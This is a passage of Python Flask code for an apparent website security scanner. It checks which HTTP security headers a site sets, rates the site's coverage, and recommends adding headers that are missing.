            'Feature-Policy': headers.get('Feature-Policy'),
            'Permissions-Policy': headers.get('Permissions-Policy')
        }

        # Initialize lists to keep track of implemented and missing headers
        implemented_headers = []
        missing_headers = []
        recommendations = {}

        # Check which headers are implemented and which are missing
        for header, value in security_headers.items():
            if value:
                implemented_headers.append(f"{header}: {value}")
            else:
                missing_headers.append(header)

        # Provide recommendations for missing headers
        missing_headers_recommendations = {
            'X-Frame-Options': 'This header helps protect your site against clickjacking attacks.',
            'X-Content-Type-Options': 'This header prevents MIME type sniffing, which can reduce XSS risks.',
            'Strict-Transport-Security': 'This enforces HTTPS and protects against downgrade attacks.',
            'Content-Security-Policy': 'This helps prevent XSS by specifying trusted sources of content.',
            'X-XSS-Protection': 'This header prevents some browsers from executing malicious JavaScript.',
            'Referrer-Policy': 'This controls how much referrer information is sent with requests.',
            'Feature-Policy': 'This controls which browser features are allowed on your site.',
            'Permissions-Policy': 'This controls what permissions can be granted to your site.'
        }

        # Add recommendations for each missing header
        for header in missing_headers:
            recommendations[header] = missing_headers_recommendations.get(header, 'No recommendation available.')

        # Determine status based on how many headers are implemented
        if len(implemented_headers) >= 6:
            status = 'Good'
        elif len(implemented_headers) >= 3:
            status = 'Fair'
        else:
            status = 'Poor'

        # Properly format the output for better readability
        return {
            'description': 'Checks for implementation of security headers.',
            'status': status,
            'details': {
                'implemented_headers': ', '.join(implemented_headers),  # Join as string for front-end display
                'missing_headers': ', '.join(missing_headers),  # Join missing headers as a string
                'recommendations': ', '.join([f"{header}: {rec}" for header, rec in recommendations.items()])  # Properly format recommendations
            }
        }

    except requests.RequestException:
        return {
            'description': 'Checks for implementation of security headers.',
            'status': 'Error',
            'details': {'error': 'Failed to connect to the website.'}
        }




# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

# Modify the Flask route to use the crawler
@app.route('/run_tests', methods=['POST'])
def api_run_tests():
    data = request.json
    url = data.get('url')

    if not url:
        return jsonify({'error': 'No URL provided'}), 400

    crawler_results = crawl_website(url)
    return jsonify(crawler_results)

if __name__ == '__main__':
    app.run(debug=True)
